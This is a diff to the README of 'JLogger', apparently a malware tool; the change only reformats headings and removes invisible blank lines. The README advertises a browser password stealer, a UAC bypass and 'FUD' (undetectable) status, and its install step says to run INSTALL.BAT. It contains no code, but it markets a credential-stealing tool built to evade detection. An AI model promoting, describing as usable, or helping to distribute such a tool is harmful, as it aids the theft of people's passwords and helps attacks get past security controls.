@@ -1,6 +1,7 @@
  ☢️ JLogger ☢️                                                                                                                                              
 
- • features •
+
+ ⓘ features ⓘ
  
 
  ➼ BROWSER PASS STEALER
@@ -16,18 +17,9 @@
  ➼ UAC BYPASS
 
  ➼ FUD
- ‎
- ‎ 
- ‎ 
- ‎ 
- ‎ 
- ‎ 
- ‎ 
- ‎ 
- ‎ 
- ‎ 
- ‎ 
- • install guide •
+
+
+ ⓘ install guide ‎ⓘ
 
 
  ➼ RUN INSTALL.BAT
